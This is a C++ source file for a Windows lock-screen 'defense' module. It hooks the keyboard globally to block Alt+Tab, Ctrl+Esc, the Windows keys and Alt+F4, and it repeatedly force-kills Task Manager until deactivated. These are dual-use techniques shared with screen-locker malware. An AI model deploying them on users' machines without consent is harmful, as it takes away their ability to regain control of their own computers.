#include "LockScreenDefense.h"
#include <thread>
#include <chrono>
#include <iostream>


LockScreenDefense::LockScreenDefense() = default;
LockScreenDefense::~LockScreenDefense() = default;

LockScreenDefense& LockScreenDefense::getInstance() {
    static LockScreenDefense instance;
    return instance;
}

void LockScreenDefense::activate(HWND hwndParam) {
    if (active) return;
    active = true;
    hwnd = hwndParam;

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, nullptr, 0);

    if (hwnd)
        SetWindowLongPtr(hwnd, GWLP_WNDPROC, (LONG_PTR)LockWindowProc);

    startTaskManagerBlocker();
    std::cout << "[Defense] Activated\n";
}

void LockScreenDefense::deactivate() {
    if (!active) return;
    active = false;

    if (keyboardHook) {
        bool success = UnhookWindowsHookEx(keyboardHook);
        std::cout << "[Defense] Unhook success: " << success << std::endl;
        keyboardHook = nullptr;
    }

    if (hwnd) {
        LONG_PTR result = SetWindowLongPtr(hwnd, GWLP_WNDPROC, (LONG_PTR)DefWindowProc);
        std::cout << "[Defense] Restoring WNDPROC: " << (result != 0 ? "OK" : "FAIL") << std::endl;
        hwnd = nullptr;
    }

    stopTaskManagerBlocker();
    std::cout << "[Defense] Deactivated\n";
}

LRESULT CALLBACK LockScreenDefense::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        if ((p->vkCode == VK_TAB && GetAsyncKeyState(VK_MENU) & 0x8000) ||
            (p->vkCode == VK_ESCAPE && GetAsyncKeyState(VK_CONTROL) & 0x8000) ||
            p->vkCode == VK_LWIN || p->vkCode == VK_RWIN) {
            return 1;
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

LRESULT CALLBACK LockScreenDefense::LockWindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_SYSCOMMAND && (wParam & 0xFFF0) == SC_CLOSE) {
        return 0; // Block Alt+F4
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

void LockScreenDefense::startTaskManagerBlocker() {
    killerThread = std::thread([this]() {
        while (active) {
            system("taskkill /f /im taskmgr.exe >nul 2>&1");
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }
    });
}

void LockScreenDefense::stopTaskManagerBlocker() {
    if (killerThread.joinable()) {
        killerThread.join();
    }
}
